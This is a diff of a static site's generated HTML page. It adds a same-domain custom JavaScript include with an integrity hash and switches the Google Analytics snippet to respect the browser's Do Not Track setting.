@@ -513,6 +507,11 @@ Side entrance</a>.</p>
   
 
   
+  
+  
+  <script src="https://vyorkin.org/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="></script>
+  
+  
 
   
 
@@ -521,7 +520,7 @@ Side entrance</a>.</p>
       <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
       <script>
         var doNotTrack = false;
-        if ( false ) {
+        if ( true ) {
           var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
           var doNotTrack = (dnt == "1" || dnt == "yes");
         }
